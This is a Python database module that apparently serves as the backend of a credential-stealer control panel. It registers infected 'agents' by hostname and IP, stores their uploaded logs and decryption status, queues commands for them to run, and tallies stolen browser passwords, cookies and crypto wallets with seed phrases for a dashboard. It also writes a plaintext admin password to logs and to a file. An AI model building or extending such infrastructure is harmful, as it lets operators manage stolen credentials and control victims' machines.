"""
Database utilities and session management
"""

from contextlib import contextmanager
from typing import Generator, Optional, List, Dict, Any
from datetime import datetime, timedelta
import logging

from sqlalchemy import create_engine, and_, or_, func
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy.pool import StaticPool

from ..config import settings
from ..models.log_model import Base, Agent, Log, Command, User, BrowserData, CryptoWallet

logger = logging.getLogger(__name__)


class Database:
    """Database connection and session management"""
    
    def __init__(self):
        self.engine = None
        self.SessionLocal = None
        self._initialize()
    
    def _initialize(self):
        """Initialize database connection"""
        # SQLite specific settings
        connect_args = {"check_same_thread": False} if settings.database_url.startswith("sqlite") else {}
        
        self.engine = create_engine(
            settings.database_url,
            connect_args=connect_args,
            poolclass=StaticPool if settings.database_url.startswith("sqlite") else None,
            **settings.database_settings
        )
        
        self.SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=self.engine)
        
        # Create tables
        Base.metadata.create_all(bind=self.engine)
        logger.info("Database initialized successfully")
    
    @contextmanager
    def get_session(self) -> Generator[Session, None, None]:
        """Get database session context manager"""
        session = self.SessionLocal()
        try:
            yield session
            session.commit()
        except Exception:
            session.rollback()
            raise
        finally:
            session.close()


# Global database instance
db = Database()


class AgentRepository:
    """Repository for agent operations"""
    
    @staticmethod
    def create_or_update(
        session: Session,
        agent_id: str,
        hostname: str,
        ip_address: str,
        **kwargs
    ) -> Agent:
        """Create new agent or update existing"""
        agent = session.query(Agent).filter_by(agent_id=agent_id).first()
        
        if agent:
            # Update existing agent
            agent.hostname = hostname
            agent.ip_address = ip_address
            agent.last_seen = datetime.utcnow()
            agent.is_active = True
            
            for key, value in kwargs.items():
                if hasattr(agent, key):
                    setattr(agent, key, value)
        else:
            # Create new agent
            agent = Agent(
                agent_id=agent_id,
                hostname=hostname,
                ip_address=ip_address,
                **kwargs
            )
            session.add(agent)
        
        session.flush()
        return agent
    
    @staticmethod
    def get_active_agents(session: Session, hours: int = 24) -> List[Agent]:
        """Get agents active in the last N hours"""
        cutoff_time = datetime.utcnow() - timedelta(hours=hours)
        return session.query(Agent).filter(
            and_(
                Agent.is_active == True,
                Agent.last_seen >= cutoff_time
            )
        ).all()
    
    @staticmethod
    def mark_inactive(session: Session, hours: int = 48):
        """Mark agents as inactive if not seen for N hours"""
        cutoff_time = datetime.utcnow() - timedelta(hours=hours)
        session.query(Agent).filter(
            Agent.last_seen < cutoff_time
        ).update({"is_active": False})


class LogRepository:
    """Repository for log operations"""
    
    @staticmethod
    def create_log(
        session: Session,
        agent: Agent,
        log_type: str,
        data: Dict[str, Any],
        **kwargs
    ) -> Log:
        """Create new log entry"""
        log = Log(
            agent_id=agent.id,
            log_type=log_type,
            data=data,
            items_count=len(data.get("items", [])),
            **kwargs
        )
        session.add(log)
        session.flush()
        return log
    
    @staticmethod
    def get_recent_logs(
        session: Session,
        limit: int = 100,
        log_type: Optional[str] = None,
        agent_id: Optional[int] = None
    ) -> List[Log]:
        """Get recent logs with filters"""
        query = session.query(Log)
        
        if log_type:
            query = query.filter(Log.log_type == log_type)
        
        if agent_id:
            query = query.filter(Log.agent_id == agent_id)
        
        return query.order_by(Log.timestamp.desc()).limit(limit).all()
    
    @staticmethod
    def get_unprocessed_logs(session: Session) -> List[Log]:
        """Get logs that haven't been processed yet"""
        return session.query(Log).filter(
            Log.is_processed == False
        ).order_by(Log.timestamp).all()
    
    @staticmethod
    def mark_processed(session: Session, log_id: int, success: bool = True):
        """Mark log as processed"""
        log = session.query(Log).get(log_id)
        if log:
            log.is_processed = True
            log.decryption_status = "success" if success else "failed"


class CommandRepository:
    """Repository for command operations"""
    
    @staticmethod
    def create_command(
        session: Session,
        agent: Agent,
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Command:
        """Create new command for agent"""
        command = Command(
            agent_id=agent.id,
            command_type=command_type,
            parameters=parameters or {}
        )
        session.add(command)
        session.flush()
        return command
    
    @staticmethod
    def get_pending_commands(
        session: Session,
        agent_id: int
    ) -> List[Command]:
        """Get pending commands for agent"""
        return session.query(Command).filter(
            and_(
                Command.agent_id == agent_id,
                Command.status == "pending"
            )
        ).order_by(Command.created_at).all()
    
    @staticmethod
    def mark_sent(session: Session, command_id: int):
        """Mark command as sent"""
        command = session.query(Command).get(command_id)
        if command:
            command.status = "sent"
            command.sent_at = datetime.utcnow()
    
    @staticmethod
    def mark_executed(
        session: Session,
        command_id: int,
        success: bool,
        result: Optional[Dict[str, Any]] = None,
        error: Optional[str] = None
    ):
        """Mark command as executed"""
        command = session.query(Command).get(command_id)
        if command:
            command.status = "executed" if success else "failed"
            command.executed_at = datetime.utcnow()
            command.result = result
            command.error_message = error


class StatsRepository:
    """Repository for statistics"""
    
    @staticmethod
    def get_dashboard_stats(session: Session) -> Dict[str, Any]:
        """Get statistics for dashboard"""
        total_agents = session.query(Agent).count()
        active_agents = session.query(Agent).filter(Agent.is_active == True).count()
        
        total_logs = session.query(Log).count()
        logs_24h = session.query(Log).filter(
            Log.timestamp >= datetime.utcnow() - timedelta(hours=24)
        ).count()
        
        # Log type breakdown
        log_types = session.query(
            Log.log_type,
            func.count(Log.id).label("count")
        ).group_by(Log.log_type).all()
        
        # Browser data stats
        browser_stats = session.query(
            func.sum(BrowserData.passwords_count).label("passwords"),
            func.sum(BrowserData.cookies_count).label("cookies"),
            func.count(BrowserData.id).filter(BrowserData.has_crypto == True).label("crypto_browsers")
        ).first()
        
        # Crypto wallet stats
        wallet_stats = session.query(
            func.count(CryptoWallet.id).label("total"),
            func.count(CryptoWallet.id).filter(CryptoWallet.has_seed_phrase == True).label("with_seed")
        ).first()
        
        return {
            "agents": {
                "total": total_agents,
                "active": active_agents
            },
            "logs": {
                "total": total_logs,
                "last_24h": logs_24h,
                "by_type": {log_type: count for log_type, count in log_types}
            },
            "browser_data": {
                "passwords": browser_stats.passwords or 0,
                "cookies": browser_stats.cookies or 0,
                "crypto_enabled": browser_stats.crypto_browsers or 0
            },
            "crypto_wallets": {
                "total": wallet_stats.total or 0,
                "with_seed": wallet_stats.with_seed or 0
            }
        }
    
    @staticmethod
    def get_agent_activity(session: Session, days: int = 7) -> List[Dict[str, Any]]:
        """Get agent activity for the last N days"""
        start_date = datetime.utcnow() - timedelta(days=days)
        
        activity = session.query(
            func.date(Log.timestamp).label("date"),
            func.count(func.distinct(Log.agent_id)).label("active_agents"),
            func.count(Log.id).label("logs_count")
        ).filter(
            Log.timestamp >= start_date
        ).group_by(
            func.date(Log.timestamp)
        ).order_by("date").all()
        
        return [
            {
                "date": str(date),
                "active_agents": active_agents,
                "logs_count": logs_count
            }
            for date, active_agents, logs_count in activity
        ]


# Helper functions for common operations
def get_or_create_agent(agent_id: str, hostname: str, ip_address: str, **kwargs) -> Agent:
    """Get or create an agent"""
    with db.get_session() as session:
        return AgentRepository.create_or_update(
            session, agent_id, hostname, ip_address, **kwargs
        )


def create_log_entry(
    agent_id: str,
    log_type: str,
    data: Dict[str, Any],
    **kwargs
) -> Log:
    """Create a new log entry"""
    with db.get_session() as session:
        agent = session.query(Agent).filter_by(agent_id=agent_id).first()
        if not agent:
            raise ValueError(f"Agent {agent_id} not found")
        
        return LogRepository.create_log(session, agent, log_type, data, **kwargs)


def get_dashboard_stats() -> Dict[str, Any]:
    """Get dashboard statistics"""
    with db.get_session() as session:
        return StatsRepository.get_dashboard_stats(session)


# Database initialization function
def init_database():
    """Initialize database with default data"""
    import secrets
    import string
    
    with db.get_session() as session:
        # Check if admin user exists
        admin = session.query(User).filter_by(username="admin").first()
        if not admin:
            from ..models.user_model import UserManager
            
            # Generate secure random password
            alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
            temp_password = ''.join(secrets.choice(alphabet) for _ in range(16))
            
            admin = User(
                username="admin",
                email="admin@rt-srt.local",
                password_hash=UserManager.hash_password(temp_password),
                is_admin=True,
                api_token=UserManager.generate_api_token()
            )
            session.add(admin)
            session.commit()
            
            logger.info(f"Created admin user with temporary password: {temp_password}")
            logger.warning("IMPORTANT: Password change required on first login!")
            
            # Write password to secure file
            from pathlib import Path
            password_file = Path("admin_temp_password.txt")
            password_file.write_text(f"Admin temporary password: {temp_password}\nChange immediately after first login!")
            password_file.chmod(0o600)  # Read-write for owner only
            logger.info(f"Temporary password saved to: {password_file.absolute()}")


# Export all utilities
__all__ = [
    "db",
    "Database",
    "AgentRepository",
    "LogRepository",
    "CommandRepository",
    "StatsRepository",
    "get_or_create_agent",
    "create_log_entry",
    "get_dashboard_stats",
    "init_database"
]